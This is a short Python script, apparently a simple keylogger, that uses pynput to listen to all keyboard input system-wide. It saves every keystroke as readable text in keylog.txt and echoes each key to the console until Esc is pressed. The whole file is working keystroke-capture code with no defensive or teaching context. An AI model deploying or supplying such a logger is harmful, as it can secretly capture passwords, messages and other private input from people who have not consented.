import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    
    try:
        print(f"Key {key.char} pressed")
        
    except AttributeError:
        print(f"special key {key} pressed")
        
def write_file(keys):
    with open("keylog.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

            
def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        # stop listener
        return False
    
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()